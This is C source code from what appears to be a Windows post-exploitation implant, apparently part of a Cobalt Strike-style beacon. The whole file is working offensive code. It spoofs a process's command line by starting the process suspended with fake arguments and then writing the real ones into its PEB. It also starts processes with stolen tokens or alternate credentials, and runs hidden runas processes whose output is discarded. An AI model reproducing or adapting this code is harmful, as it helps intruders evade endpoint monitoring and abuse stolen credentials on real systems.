#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "beacon.h"
#include "commands.h"
#include "parse.h"
#include "argue.h"
#include "process.h"

BOOL execute_program_with_token(PROCESS_CONTEXT * ctx);

extern HANDLE atoken;
extern ALTCREDS acreds;

typedef struct _UNICODE_STRING {
	USHORT  Length;
	USHORT  MaximumLength;
	WCHAR * Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

#if defined _M_X64
BOOL argue_restore(PROCESS_INFORMATION * pi, ARGUMENT_RECORD * record) {
	CONTEXT        ctx;
	LPVOID         rtlUserProcParamsAddress;
	UNICODE_STRING commandLine = { 0 };
	WCHAR        * commandLineContents;
	DWORD          old;
	SIZE_T          wrote;

	/* probably not going to work, not going to be able to update thread context */
	if (!is_x64_process(pi->hProcess)) {
		post_error_na(0x43);
		return FALSE;
	}

	/* query some information from our remote thread */
	ctx.ContextFlags = CONTEXT_INTEGER;
	if (!GetThreadContext(pi->hThread, &ctx)) {
		post_error_d(0x41, GetLastError());
		return FALSE;
	}

	if (!ReadProcessMemory(pi->hProcess, (PCHAR)(ctx.Rdx) + 0x20, (LPVOID)&rtlUserProcParamsAddress, sizeof(LPVOID), NULL)) {
		post_error_d(0x41, GetLastError());
		return FALSE;
	}

	if (!ReadProcessMemory(pi->hProcess, (PCHAR)rtlUserProcParamsAddress + 0x70, &commandLine, sizeof(commandLine), NULL)) {
		post_error_d(0x41, GetLastError());
		return FALSE;
	}

	/* make the permissions good */
	if (!VirtualProtectEx(pi->hProcess, commandLine.Buffer, commandLine.MaximumLength, PAGE_READWRITE, &old)) {
		post_error_d(0x41, GetLastError());
		return FALSE;
	}

	/* convert our command line contents, please */
	commandLineContents = (WCHAR *)malloc(commandLine.MaximumLength);
	memset((char *)commandLineContents, 0, commandLine.MaximumLength);

	if (!toWideChar(record->realargs, commandLineContents, commandLine.MaximumLength / 2)) {
		post_error_na(0x42);
		memset((char *)commandLineContents, 0, commandLine.MaximumLength);
		free(commandLineContents);
		return FALSE;
	}

	/* push it! */
	if (!WriteProcessMemory(pi->hProcess, commandLine.Buffer, (char *)commandLineContents, commandLine.MaximumLength, &wrote)) {
		post_error_d(0x41, GetLastError());
		memset((char *)commandLineContents, 0, commandLine.MaximumLength);
		free(commandLineContents);
		return FALSE;
	}
	/* TODO: the commandLineContents is not clean,released but should have been copied into pi->hProcess */

	return TRUE;
}
#elif defined _M_IX86
BOOL argue_restore(PROCESS_INFORMATION * pi, ARGUMENT_RECORD * record) {
	CONTEXT        ctx;
	LPVOID         rtlUserProcParamsAddress;
	UNICODE_STRING commandLine = { 0 };
	WCHAR        * commandLineContents;
	DWORD          old;
	DWORD          wrote;

	/* probably not going to work, not going to be able to update thread context */
	if (is_x64_process(pi->hProcess)) {
		post_error_na(0x40);
		return FALSE;
	}

	/* query some information from our remote thread */
	ctx.ContextFlags = CONTEXT_INTEGER;
	if (!GetThreadContext(pi->hThread, &ctx)) {
		post_error_d(0x41, GetLastError());
		return FALSE;
	}

	if (!ReadProcessMemory(pi->hProcess, (PCHAR)(ctx.Ebx) + 0x10, (LPVOID)&rtlUserProcParamsAddress, sizeof(LPVOID), NULL)) {
		post_error_d(0x41, GetLastError());
		return FALSE;
	}

	if (!ReadProcessMemory(pi->hProcess, (PCHAR)rtlUserProcParamsAddress + 0x40, &commandLine, sizeof(commandLine), NULL)) {
		post_error_d(0x41, GetLastError());
		return FALSE;
	}

	/* make the permissions good */
	if (!VirtualProtectEx(pi->hProcess, commandLine.Buffer, commandLine.MaximumLength, PAGE_READWRITE, &old)) {
		post_error_d(0x41, GetLastError());
		return FALSE;
	}

	/* convert our command line contents, please */
	commandLineContents = (WCHAR *)malloc(commandLine.MaximumLength);
	memset((char *)commandLineContents, 0, commandLine.MaximumLength);

	if (!toWideChar(record->realargs, commandLineContents, commandLine.MaximumLength / 2)) {
		post_error_na(0x42);
		memset((char *)commandLineContents, 0, commandLine.MaximumLength);
		free(commandLineContents);
		return FALSE;
	}

	/* push it! */
	if (!WriteProcessMemory(pi->hProcess, commandLine.Buffer, (char *)commandLineContents, commandLine.MaximumLength, &wrote)) {
		post_error_d(0x41, GetLastError());
		memset((char *)commandLineContents, 0, commandLine.MaximumLength);
		free(commandLineContents);
		return FALSE;
	}
	/* TODO: the commandLineContents is not clean,released but should have been copied into pi->hProcess */
	
	return TRUE;
}
#endif

BOOL execute_program_with_creds(PROCESS_CONTEXT * ctx, wchar_t * wcmdline, wchar_t * p_wcwd) {
	if (CreateProcessWithLogonW(acreds.user, acreds.domain, acreds.password, LOGON_NETCREDENTIALS_ONLY, NULL, wcmdline, ctx->flags, NULL, p_wcwd, (LPSTARTUPINFOW)ctx->si, ctx->pi)) {
		return TRUE;
	}
#if defined _M_IX86
	/*
	 * Similar problem to the above. We'll end up back here, anyways.
	 */
	else if (GetLastError() == 3 && strlen(ctx->cbuffer) < 256) {
		/* replace sysnative with system32. Really. */
		char * foundp = strstr(ctx->cbuffer, "sysnative");
		if (foundp != NULL) {
			char rest[256];
			memset(rest, 0, 256);

			/* get rid of the sysnative nonsense */
			memcpy(foundp, "system32", 8);
			foundp += 9; /* move ahead by 9 bytes */

			/* copy the rest of the data over to rest */
			memcpy(rest, foundp, strlen(foundp));
			foundp -= 1; /* move back by 1 byte */

			/* now, copy the data back to cmdbuff */
			memcpy(foundp, rest, strlen(rest) + 1);

			/* why no infinite recursion? because we replaced sysnative with system32 */
			return execute_program_with_token(ctx);
		}
	}
#endif

	/* both of the above steps failed. */
	post_error_sd(0x045, ctx->cbuffer, GetLastError());
	return FALSE;
}

BOOL execute_program_with_token(PROCESS_CONTEXT * ctx) {
	wchar_t wcmdline[1024] = { 0 };
	wchar_t wcwd[1024] = { 0 };
	wchar_t * p_wcwd = NULL;
	size_t  size;

	ctx->si->lpDesktop  = NULL; /* we don't want to mess with this */

	/* convert cbuffer to wcmdline */
	if (!toWideChar(ctx->cbuffer, wcmdline, 1024)) {
		post_error_d(0x7, ctx->clen);
		return FALSE;
	}

	/* figure out the current working directory */
	size = GetCurrentDirectoryW(0, NULL);

	if (size < 1024) {
		GetCurrentDirectoryW(1024, wcwd);
		p_wcwd = wcwd;
	}

	/* fall back to CreateProcessWithTokenW */
	if (CreateProcessWithTokenW(atoken, LOGON_NETCREDENTIALS_ONLY, NULL, wcmdline, ctx->flags, NULL, p_wcwd, (LPSTARTUPINFOW)ctx->si, ctx->pi)) {
		return TRUE;
	}
	else if (GetLastError() == ERROR_PRIVILEGE_NOT_HELD && CreateProcessWithLogonW != NULL && acreds.active == TRUE) {
		return execute_program_with_creds(ctx, wcmdline, p_wcwd);
	}
	/*
	 * CreateProcessWithLogonW AND CreateProcessWithTokenW will fail with ERROR_INVALID_PARAMETER when the EXTENDED_STARTUPINFO_PRESENT
	 * flag is set. CS sets this flag when ppid is set or blockdlls is on. Error 0x50 explains this.
	 *
	 * https://stackoverflow.com/questions/28130082/how-to-use-createprocesswithlogonw-with-extended-attributes-startupinfoex
	 *
	 * NOTE: it is possible to dork with the TEB to make CreateProcessWithLogonW have a different parent process ID. This has the 
	 * advantage that this attack chain works in a few more cases (notably powerpick benefits). But, anything that sends output via
	 * STDOUT will have the output swallowed (unfortunately).
	 *
	 * https://gist.github.com/tyranid/abad5008f5768b7718cd11d1a76a3763
	 */
	else if (GetLastError() == ERROR_INVALID_PARAMETER && ctx->si->cb == sizeof(STARTUPINFOEXW) && CreateProcessWithLogonW != NULL) {
		post_error_sd(0x4a, ctx->cbuffer, GetLastError());
		return FALSE;
	}
#if defined _M_IX86
	/*
	 *  This happens if we're in an x86 context and pass a sysnative path. What's the real matter?
	 *  Well, CreateProcessWithTokenW does not seem to be aware of Wow64 File System Redirection. It always searches
	 *  for a value as-if this redirection is disabled. Very annoying. This check allows our post-ex jobs that
	 *  rely on a sysnative path to execute with a token successfully.  Is this janky as hell? Absolutely, but so is
	 *  performing red team operations from an x86 context.
	 */
	else if (GetLastError() == 3 && strlen(ctx->cbuffer) < 256) {
		/* replace sysnative with system32. Really. */
		char * foundp = strstr(ctx->cbuffer, "sysnative");
		if (foundp != NULL) {
			char rest[256];
			memset(rest, 0, 256);

			/* get rid of the sysnative nonsense */
			memcpy(foundp, "system32", 8);
			foundp += 9; /* move ahead by 9 bytes */

			/* copy the rest of the data over to rest */
			memcpy(rest, foundp, strlen(foundp));
			foundp -= 1; /* move back by 1 byte */

			/* now, copy the data back to cmdbuff */
			memcpy(foundp, rest, strlen(rest) + 1);

			/* why no infinite recursion? because we replaced sysnative with system32 */
			return execute_program_with_token(ctx);
		}
	}
#endif

	/* both of the above steps failed. */
	post_error_sd(0x29, ctx->cbuffer, GetLastError());
	return FALSE;
}

/* shortcut to manage some execution stuff across the board */
BOOL _execute_program(PROCESS_CONTEXT * ctx) {
	/* We have a token that we want to create the process with. */
	if (atoken != NULL && !ctx->ignoreToken) {
		/* create our process */
		if (CreateProcessAsUser(atoken, NULL, ctx->cbuffer, NULL, NULL, TRUE, ctx->flags, NULL, NULL, ctx->si, ctx->pi)) {
			return TRUE;
		}
		/* this happens when atoken was acquired via getsystem or we're in an interactive desktop session */
		else if (GetLastError() == ERROR_PRIVILEGE_NOT_HELD && CreateProcessWithTokenW != NULL) {
			return execute_program_with_token(ctx);
		}

		post_error_sd(0x29, ctx->cbuffer, GetLastError());
		return FALSE;
	}
	/* create the process the normal way plz */
	else if (!CreateProcessA(NULL, ctx->cbuffer, NULL, NULL, TRUE, ctx->flags, NULL, NULL, ctx->si, ctx->pi)) {
		post_error_sd(0x30, ctx->cbuffer, GetLastError());
		return FALSE;
	}
	else {
		return TRUE;
	}
}

BOOL execute_program(PROCESS_CONTEXT * ctx) {
	ARGUMENT_RECORD record;
	BOOL            result;

	if ((ctx->flags & CREATE_SUSPENDED) != CREATE_SUSPENDED && argue_should_spoof(ctx->cbuffer, &record)) {
		/* update our context */
		ctx->cbuffer  = record.fakeargs;		/* QUESTION: is it ok to not update clen here? clen not used; so probably? */        
		ctx->flags   |= CREATE_SUSPENDED;

		/* execute our program in a suspended state */
		result = _execute_program(ctx);

		/* restore its arguments by mucking with the PEB */
		if (!argue_restore(ctx->pi, &record)) {
			TerminateProcess(ctx->pi->hProcess, 0);
			return FALSE;
		}
		else {
			ResumeThread(ctx->pi->hThread);
		}
		return result;
	}
	else {
		/* execute everything as normal */
		return _execute_program(ctx);
	}
}

/* all of these args are 1024 bytes */
BOOL runas(char * domain, char * user, char * pass, char * cmdline, DWORD flags, PROCESS_INFORMATION * piptr) {
	datap * local;
	wchar_t * wcmdline;
	wchar_t * wdomain;
	wchar_t * wuser;
	wchar_t * wpass;
	wchar_t * wcwd;
	wchar_t * p_wcwd = NULL;
	BOOL      result;

	size_t size;

	STARTUPINFO si;

	/* allocate some mmeory */
	local = data_alloc(sizeof(wchar_t) * (4096 + MAX_RUNAS_CMD));
	wcmdline = (wchar_t *)data_ptr(local, MAX_RUNAS_CMD);
	wdomain = (wchar_t *)data_ptr(local, 1024);
	wuser = (wchar_t *)data_ptr(local, 1024);
	wpass = (wchar_t *)data_ptr(local, 1024);
	wcwd = (wchar_t *)data_ptr(local, 1024);

	/* reset some stuff */
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(piptr, sizeof(PROCESS_INFORMATION));

	/* further process our startup info data structure */
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = NULL;
	si.hStdError = NULL;
	si.hStdInput = NULL;
	si.lpDesktop = NULL; /* we don't want to mess with this */

	/* covert some parameters to their wide char vars */
	toWideChar(cmdline, wcmdline, MAX_RUNAS_CMD);
	toWideChar(user, wuser, 1024);
	toWideChar(pass, wpass, 1024);
	toWideChar(domain, wdomain, 1024);

	/* figure out the current working directory */
	size = GetCurrentDirectoryW(0, NULL);

	if (size < 1024) {
		GetCurrentDirectoryW(1024, wcwd);
		p_wcwd = wcwd;
	}

	/* try to execute the action */
	if (CreateProcessWithLogonW(wuser, wdomain, wpass, LOGON_WITH_PROFILE, NULL, wcmdline, CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW | flags, NULL, p_wcwd, (LPSTARTUPINFOW)&si, piptr)) {
		result = TRUE;
	}
	else {
		post_error(0x35, "%s as %s\\%s: %d", cmdline, domain, user, GetLastError());
		result = FALSE;
	}

	/* clean up */
	data_free(local);

	return result;
}
